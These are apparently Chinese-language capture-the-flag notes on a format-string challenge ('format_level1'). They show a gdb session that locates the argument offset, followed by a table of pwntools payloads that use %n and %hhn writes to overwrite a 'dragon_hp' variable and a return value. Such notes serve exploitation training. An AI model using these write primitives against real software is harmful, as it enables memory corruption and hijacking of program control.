计算偏移值

```sh
format_level1 为例，
b*0x0x8049684 \n r, 输入3
► 0x8049684 <talk+81>     call   read@plt

gdb$ ni
输入 aaaabaaacaaadaaa

   0x8049684 <talk+81>     call   read@plt
► 0x8049689 <talk+86>     add    esp, 0x10

gdb$ stack
00:0000│   esp 0xffffd320 —▸ 0xffffd33c ◂— 'aaaabaaacaaadaaa' ; 参数1: 格式化字符
01:0004│ 1     0xffffd324 —▸ 0xffffd33c ◂— 'aaaabaaacaaadaaa' ; 参数2: 地址, 从这里数
02:0008│ 2     0xffffd328 ◂— 0x10
03:000c│ 3     0xffffd32c —▸ 0x8049643 (talk+16) ◂— add ebx, 0x2975
04:0010│ 4     0xffffd330 —▸ 0xf7fa4620 (_IO_2_1_stdin_) ◂— 0xfbad208b
05:0014│ 5     0xffffd334 —▸ 0x804a231 ◂— 0x47006425 /* '%d' */
06:0018│ 6     0xffffd338 —▸ 0xffffd354 —▸ 0x804bfb8 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bec0 (_DYNAMIC) ◂— 0x1
07:001c│ 7 eax 0xffffd33c ◂— 'aaaabaaacaaadaaa'               ; 为第7个
08:0020│     0xffffd340 ◂— 'baaacaaadaaa'
gdb$ fmtarg 0xffffd33c  -> 7 ("\%6$p") 也是7
```

测试值

| payload                                          | value                   | Desc                                                      |
| ------------------------------------------------ | ----------------------- | --------------------------------------------------------- |
| `b'%8$n' + p32(dragon_hp)`                       | -1                      |                                                           |
| `b'c%9$naaa' + p32(dragon_hp)`                   | 0                       | 这时栈中 第 7 个: `c%9$` 第 8 个 `naaa` 第 9 个 dragon_hp |
| `b'%128c%10$nbb' + p32(dragon_hp+3)`             | dragon_hp+3 设置为 0x80 | `bb`是填充 4 字节对齐, 用`aa`或者其他都行                 |
| `p32(dragon_hp) + b'%7\$n'`                      | 0x3                     | 正常可能是 4,前面 4 个字节                                |
| `p32(dragon_hp) + b'%15c%7\$n'`                  | 0x12 = 15+3             |                                                           |
| `b"%23p%10$hhn".ljust(12, b'a') + p32(func_ret)` |                         | func_ret 修改为 23 -> 0x17 , 用 c 和用 p 效果一样         |